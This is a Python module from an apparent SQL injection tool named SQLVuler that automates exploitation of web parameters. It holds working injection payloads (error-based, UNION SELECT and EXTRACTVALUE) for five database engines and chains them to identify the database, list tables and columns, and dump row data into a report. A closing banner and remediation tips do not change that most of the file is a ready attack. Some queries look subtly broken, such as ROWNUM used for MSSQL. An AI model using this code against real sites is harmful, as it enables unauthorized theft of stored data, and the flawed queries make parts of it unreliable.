#!/usr/bin/env python3
"""
Exploitation Engine for SQLVuler
Handles exploitation of SQL injection vulnerabilities
"""

import re
import time
from colorama import Fore, Style

from sqlvuler.utils.logger import get_logger
from sqlvuler.core.database_identifier import DatabaseIdentifier

class ExploitationEngine:
    """Handles exploitation of SQL injection vulnerabilities"""
    
    def __init__(self, config_manager=None, request_handler=None, payload_manager=None):
        """
        Initialize the Exploitation Engine
        
        Args:
            config_manager: Configuration manager instance
            request_handler: Request handler instance
            payload_manager: Payload manager instance
        """
        self.logger = get_logger()
        self.config_manager = config_manager
        self.request_handler = request_handler
        self.payload_manager = payload_manager
        
        # Initialize database identifier
        self.db_identifier = DatabaseIdentifier(config_manager, request_handler)
        
        # Exploitation results
        self.tables = []
        self.columns = {}
        self.data = {}
        self.current_database = None
    
    def identify_database(self, parameter):
        """
        Identify database type and version
        
        Args:
            parameter (dict): Parameter to use for identification
            
        Returns:
            dict: Database information
        """
        self.logger.info(f"Identifying database for parameter: {parameter['name']}")
        
        # Use database identifier
        db_type = self.db_identifier.identify_from_response(self._get_error_response(parameter))
        db_version = self.db_identifier.identify_version(parameter)
        db_name = self.db_identifier.identify_database(parameter)
        db_user = self.db_identifier.identify_user(parameter)
        
        db_info = self.db_identifier.get_database_info()
        
        self.logger.info(f"Database identification results: {db_info}")
        
        # Set current database
        self.current_database = db_name
        
        return db_info
    
    def _get_error_response(self, parameter):
        """
        Get error response for database identification
        
        Args:
            parameter (dict): Parameter to use
            
        Returns:
            str: Response content
        """
        # Use error-generating payload
        error_payloads = ["'", "\"", "1'", "1\"", "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)", "1' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))"]
        
        for payload in error_payloads:
            # Build and send request
            request_data = self.request_handler.build_request(parameter, payload)
            response_info = self.request_handler.send_request(request_data)
            
            if not response_info:
                continue
            
            return response_info.get("content", "")
        
        return ""
    
    def extract_tables(self, parameter):
        """
        Extract table names from the database
        
        Args:
            parameter (dict): Parameter to use
            
        Returns:
            list: Extracted table names
        """
        self.logger.info(f"Extracting tables using parameter: {parameter['name']}")
        
        # Must have identified database type
        if not self.db_identifier.db_type:
            db_info = self.identify_database(parameter)
            if not db_info["type"]:
                self.logger.error("Could not identify database type, cannot extract tables")
                return []
        
        # SQL queries for extracting tables based on database type
        db_type = self.db_identifier.db_type
        
        # Use database name if available
        db_name = self.current_database or self.db_identifier.db_name
        db_name_placeholder = f"'{db_name}'" if db_name else "database()"
        
        # Table extraction queries
        table_queries = {
            "MySQL": [
                f"' UNION SELECT GROUP_CONCAT(table_name SEPARATOR '|'),NULL FROM information_schema.tables WHERE table_schema={db_name_placeholder}-- -",
                f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema={db_name_placeholder}),0x7e))-- -"
            ],
            "PostgreSQL": [
                f"' UNION SELECT STRING_AGG(table_name, '|'),NULL FROM information_schema.tables WHERE table_schema='public'-- -"
            ],
            "SQLite": [
                f"' UNION SELECT GROUP_CONCAT(name, '|'),NULL FROM sqlite_master WHERE type='table'-- -"
            ],
            "MSSQL": [
                f"' UNION SELECT STRING_AGG(table_name, '|'),NULL FROM information_schema.tables WHERE table_catalog={db_name_placeholder}-- -"
            ],
            "Oracle": [
                f"' UNION SELECT LISTAGG(table_name, '|') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables WHERE owner=USER-- -"
            ]
        }
        
        # Get queries for detected database type
        queries = table_queries.get(db_type, [])
        
        if not queries:
            self.logger.error(f"No table extraction queries available for database type: {db_type}")
            return []
        
        # Try each query
        for query in queries:
            # Build and send request
            request_data = self.request_handler.build_request(parameter, query)
            response_info = self.request_handler.send_request(request_data)
            
            if not response_info:
                continue
            
            # Extract tables from response
            content = response_info.get("content", "")
            
            # Look for tables in the response
            # Common patterns for table lists in responses
            table_patterns = [
                r"<td>([\w\d_\|,]+)</td>",  # Tables in HTML table cell
                r"<[^>]*>([\w\d_\|,]+)</[^>]*>",  # Tables in any HTML tag
                r">([a-zA-Z0-9_\|,]{10,})<"  # Tables between HTML tags (at least 10 chars)
            ]
            
            for pattern in table_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    # Check if this looks like a list of table names (contains pipe separator)
                    if '|' in match:
                        tables = [t.strip() for t in match.split('|') if t.strip()]
                        # Filter out common values that aren't table names
                        tables = [t for t in tables if not t.lower() in ['null', 'table', 'tables']]
                        
                        if tables:
                            self.tables = tables
                            self.logger.info(f"Extracted {len(tables)} tables")
                            return tables
        
        self.logger.warning("Could not extract tables")
        return []
    
    def extract_columns(self, parameter, table):
        """
        Extract column names for a specific table
        
        Args:
            parameter (dict): Parameter to use
            table (str): Table name
            
        Returns:
            list: Extracted column names
        """
        self.logger.info(f"Extracting columns for table '{table}' using parameter: {parameter['name']}")
        
        # Must have identified database type
        if not self.db_identifier.db_type:
            db_info = self.identify_database(parameter)
            if not db_info["type"]:
                self.logger.error("Could not identify database type, cannot extract columns")
                return []
        
        # SQL queries for extracting columns based on database type
        db_type = self.db_identifier.db_type
        
        # Column extraction queries
        column_queries = {
            "MySQL": [
                f"' UNION SELECT GROUP_CONCAT(column_name SEPARATOR '|'),NULL FROM information_schema.columns WHERE table_name='{table}'-- -",
                f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_name='{table}'),0x7e))-- -"
            ],
            "PostgreSQL": [
                f"' UNION SELECT STRING_AGG(column_name, '|'),NULL FROM information_schema.columns WHERE table_name='{table}'-- -"
            ],
            "SQLite": [
                f"' UNION SELECT GROUP_CONCAT(name, '|'),NULL FROM pragma_table_info('{table}')-- -"
            ],
            "MSSQL": [
                f"' UNION SELECT STRING_AGG(column_name, '|'),NULL FROM information_schema.columns WHERE table_name='{table}'-- -"
            ],
            "Oracle": [
                f"' UNION SELECT LISTAGG(column_name, '|') WITHIN GROUP (ORDER BY column_name),NULL FROM all_tab_columns WHERE table_name=UPPER('{table}')-- -"
            ]
        }
        
        # Get queries for detected database type
        queries = column_queries.get(db_type, [])
        
        if not queries:
            self.logger.error(f"No column extraction queries available for database type: {db_type}")
            return []
        
        # Try each query
        for query in queries:
            # Build and send request
            request_data = self.request_handler.build_request(parameter, query)
            response_info = self.request_handler.send_request(request_data)
            
            if not response_info:
                continue
            
            # Extract columns from response
            content = response_info.get("content", "")
            
            # Look for columns in the response
            column_patterns = [
                r"<td>([\w\d_\|,]+)</td>",  # Columns in HTML table cell
                r"<[^>]*>([\w\d_\|,]+)</[^>]*>",  # Columns in any HTML tag
                r">([a-zA-Z0-9_\|,]{5,})<"  # Columns between HTML tags (at least 5 chars)
            ]
            
            for pattern in column_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    # Check if this looks like a list of column names (contains pipe separator)
                    if '|' in match:
                        columns = [c.strip() for c in match.split('|') if c.strip()]
                        # Filter out common values that aren't column names
                        columns = [c for c in columns if not c.lower() in ['null', 'column', 'columns']]
                        
                        if columns:
                            self.columns[table] = columns
                            self.logger.info(f"Extracted {len(columns)} columns for table '{table}'")
                            return columns
        
        self.logger.warning(f"Could not extract columns for table '{table}'")
        return []
    
    def extract_data(self, parameter, table, columns=None, limit=10):
        """
        Extract data from a specific table
        
        Args:
            parameter (dict): Parameter to use
            table (str): Table name
            columns (list): Column names (if None, all columns will be used)
            limit (int): Maximum number of rows to extract
            
        Returns:
            list: Extracted data rows
        """
        self.logger.info(f"Extracting data from table '{table}' using parameter: {parameter['name']}")
        
        # Must have identified database type
        if not self.db_identifier.db_type:
            db_info = self.identify_database(parameter)
            if not db_info["type"]:
                self.logger.error("Could not identify database type, cannot extract data")
                return []
        
        # Get columns if not provided
        if not columns:
            if table in self.columns:
                columns = self.columns[table]
            else:
                columns = self.extract_columns(parameter, table)
                
            if not columns:
                self.logger.error(f"No columns available for table '{table}', cannot extract data")
                return []
        
        # Limit to first 5 columns for efficiency
        columns = columns[:5]
        
        # SQL queries for extracting data based on database type
        db_type = self.db_identifier.db_type
        
        # Column list for query
        column_list = ",".join(columns)
        
        # Concatenation function based on database type
        concat_func = {
            "MySQL": f"CONCAT_WS('|', {column_list})",
            "PostgreSQL": f"CONCAT_WS('|', {column_list})",
            "SQLite": f"GROUP_CONCAT({columns[0]}||'|'||{columns[1]})" if len(columns) > 1 else f"{columns[0]}",
            "MSSQL": f"CONCAT_WS('|', {column_list})",
            "Oracle": f"LISTAGG({columns[0]}, '|') WITHIN GROUP (ORDER BY {columns[0]})"
        }
        
        # Data extraction queries
        data_queries = {
            "MySQL": [
                f"' UNION SELECT GROUP_CONCAT({concat_func['MySQL']} SEPARATOR '#'),NULL FROM {table} LIMIT {limit}-- -",
            ],
            "PostgreSQL": [
                f"' UNION SELECT STRING_AGG({concat_func['PostgreSQL']}, '#'),NULL FROM {table} LIMIT {limit}-- -"
            ],
            "SQLite": [
                f"' UNION SELECT GROUP_CONCAT({concat_func['SQLite']}, '#'),NULL FROM {table} LIMIT {limit}-- -"
            ],
            "MSSQL": [
                f"' UNION SELECT STRING_AGG({concat_func['MSSQL']}, '#'),NULL FROM {table} WHERE ROWNUM <= {limit}-- -"
            ],
            "Oracle": [
                f"' UNION SELECT {concat_func['Oracle']},NULL FROM {table} WHERE ROWNUM <= {limit}-- -"
            ]
        }
        
        # Get queries for detected database type
        queries = data_queries.get(db_type, [])
        
        if not queries:
            self.logger.error(f"No data extraction queries available for database type: {db_type}")
            return []
        
        # Try each query
        for query in queries:
            # Build and send request
            request_data = self.request_handler.build_request(parameter, query)
            response_info = self.request_handler.send_request(request_data)
            
            if not response_info:
                continue
            
            # Extract data from response
            content = response_info.get("content", "")
            
            # Look for data in the response
            data_patterns = [
                r"<td>([\w\d_\|#@\.,-]+)</td>",  # Data in HTML table cell
                r"<[^>]*>([\w\d_\|#@\.,-]+)</[^>]*>",  # Data in any HTML tag
                r">([a-zA-Z0-9_\|#@\.,-]{10,})<"  # Data between HTML tags (at least 10 chars)
            ]
            
            for pattern in data_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    # Check if this looks like extracted data (contains pipe and hash separator)
                    if '|' in match and '#' in match:
                        # Split into rows
                        rows = [r.strip() for r in match.split('#') if r.strip()]
                        
                        # Split each row into columns
                        data_rows = []
                        for row in rows:
                            data_row = [col.strip() for col in row.split('|')]
                            data_rows.append(data_row)
                        
                        if data_rows:
                            self.data[table] = data_rows
                            self.logger.info(f"Extracted {len(data_rows)} rows from table '{table}'")
                            return data_rows
                    
                    # If only pipe separators (single row)
                    elif '|' in match:
                        data_row = [col.strip() for col in match.split('|')]
                        data_rows = [data_row]
                        
                        self.data[table] = data_rows
                        self.logger.info(f"Extracted 1 row from table '{table}'")
                        return data_rows
        
        self.logger.warning(f"Could not extract data from table '{table}'")
        return []
    
    def dump_database(self, parameter, table_limit=5, row_limit=10):
        """
        Dump database structure and data
        
        Args:
            parameter (dict): Parameter to use
            table_limit (int): Maximum number of tables to dump
            row_limit (int): Maximum number of rows per table to dump
            
        Returns:
            dict: Dumped database information
        """
        self.logger.info(f"Dumping database using parameter: {parameter['name']}")
        
        # Step 1: Identify database
        db_info = self.identify_database(parameter)
        if not db_info["type"]:
            self.logger.error("Could not identify database, dump failed")
            return {"error": "Could not identify database"}
        
        # Step 2: Extract tables
        tables = self.extract_tables(parameter)
        if not tables:
            self.logger.error("Could not extract tables, dump failed")
            return {"error": "Could not extract tables"}
        
        # Limit number of tables
        tables = tables[:table_limit]
        
        # Step 3: Extract columns and data for each table
        for table in tables:
            columns = self.extract_columns(parameter, table)
            if columns:
                self.extract_data(parameter, table, columns, row_limit)
        
        # Prepare results
        dump_result = {
            "database": db_info,
            "tables": self.tables,
            "columns": self.columns,
            "data": self.data
        }
        
        return dump_result
    
    def generate_report(self, parameter=None, dump_result=None):
        """
        Generate a report of the exploitation results
        
        Args:
            parameter (dict): Parameter that was exploited
            dump_result (dict): Results from database dump
            
        Returns:
            str: Formatted report
        """
        if not dump_result:
            if not parameter:
                return "No exploitation results available."
            
            # Generate dump result if not provided
            dump_result = self.dump_database(parameter)
        
        # Format the report
        report = f"""
{Fore.RED}SQLVuler Exploitation Report{Style.RESET_ALL}
{Fore.YELLOW}{'=' * 60}{Style.RESET_ALL}

{Fore.CYAN}Target Information:{Style.RESET_ALL}
  URL: {parameter['url']}
  Vulnerable Parameter: {parameter['name']} ({parameter['type']})

{Fore.CYAN}Database Information:{Style.RESET_ALL}
  Type: {dump_result['database']['type'] or 'Unknown'}
  Version: {dump_result['database']['version'] or 'Unknown'}
  Current User: {dump_result['database']['user'] or 'Unknown'}
  Current Database: {dump_result['database']['database'] or 'Unknown'}

{Fore.CYAN}Database Structure:{Style.RESET_ALL}
  Tables: {len(dump_result['tables'])}
"""
        
        # Add table and column information
        if dump_result['tables']:
            report += f"\n{Fore.CYAN}Tables and Columns:{Style.RESET_ALL}\n"
            
            for table in dump_result['tables'][:10]:  # Limit to 10 tables for readability
                report += f"  - {table}\n"
                
                if table in dump_result['columns'] and dump_result['columns'][table]:
                    columns = dump_result['columns'][table]
                    # Format columns in groups of 5
                    column_groups = [columns[i:i+5] for i in range(0, len(columns), 5)]
                    for group in column_groups:
                        report += f"    {', '.join(group)}\n"
        
        # Add data information
        if dump_result['data']:
            report += f"\n{Fore.CYAN}Data Sample:{Style.RESET_ALL}\n"
            
            for table, rows in dump_result['data'].items():
                report += f"  Table: {table}\n"
                
                if table in dump_result['columns'] and dump_result['columns'][table]:
                    # Show column names as header
                    columns = dump_result['columns'][table][:5]  # Limit to first 5 columns
                    report += f"    {' | '.join(columns)}\n"
                    report += f"    {'-' * 40}\n"
                
                # Show data rows
                for row in rows[:5]:  # Limit to first 5 rows
                    row_data = [str(cell)[:20] + ('...' if len(str(cell)) > 20 else '') for cell in row[:5]]
                    report += f"    {' | '.join(row_data)}\n"
        
        # Add remediation advice
        report += f"""
{Fore.CYAN}Remediation Advice:{Style.RESET_ALL}
  1. Use parameterized queries or prepared statements
  2. Apply input validation and sanitization
  3. Implement proper error handling to avoid exposing database errors
  4. Apply the principle of least privilege to database users
  5. Consider using an ORM (Object-Relational Mapping) framework

{Fore.YELLOW}{'=' * 60}{Style.RESET_ALL}
{Fore.RED}EDUCATIONAL PURPOSE ONLY - DO NOT USE FOR UNAUTHORIZED TESTING{Style.RESET_ALL}
"""
        
        return report
    
    def reset(self):
        """Reset exploitation results"""
        self.tables = []
        self.columns = {}
        self.data = {}
        self.current_database = None
        self.db_identifier.reset()